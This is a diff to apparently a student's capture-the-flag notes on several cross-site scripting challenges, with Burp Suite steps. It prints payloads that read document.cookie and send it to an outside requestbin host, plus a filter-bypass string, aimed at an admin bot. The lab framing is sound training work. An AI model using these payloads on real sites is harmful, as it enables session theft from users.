@@ -60,4 +60,35 @@
 #      - Error = In the board, it is possible to use special characters (<'">).
 #      - Check the attack possibility of using an attack statement on the board. => <script>alert(1)</script>
 #      - Filtering "script" and "alert", so using another attack statement => <img src=x onerror=confirm(1)> 
-#      - Check the attack => <img src="x" onerror=var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;>
+#      - Check the attack => <img src="https://x" onerror="location.href='http://enjt04rx79at.x.pipedream.net/?cookie=' + document.cookie;">
+#      - Block the long subject
+#      - Check the attack on the content box
+#      - Copy URL and input the URL on the admin visit bar
+#      - Check the flag on https://public.requestbin.com/
+
+#     4) CTF XSS 5
+#      - Error = In the board, it is possible to use special characters (<'">), but it converts &lt;
+#      - Check the attack possibility of using an attack statement on the board => <script>alert(1)</script>
+#      - Using the burp suite, the website should be intercepted to step by step
+#      - Create a new post and forward
+#      - Check the attack statement => <script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
+#      - During the intercept, change the filtered attack statement
+#      - Open the new post and Copy the URL and input the URL on the admin visit bar
+#      - Check the flag on https://public.requestbin.com/
+
+#     4) CTF XSS 6
+#      - Error = When you log in wrong, the alert pops up.
+#      - Check the attack possibility in the burp suite
+#      - The POST proxy send to Repeater and change the method to GET
+#      - Check special characters and it works
+#      - Check the attack statement => +]');alert(1)//
+#      - Check the attack => +]');location.href='http://enjt04rx79at.x.pipedream.net/?cookie='%2bdocument.cookie;//
+#      - Copy URL and input the URL on the admin visit bar
+#      - Check the flag on https://public.requestbin.com/
+
+#     4) CTF XSS Challenge
+#      - Error = 
+
+
+
+
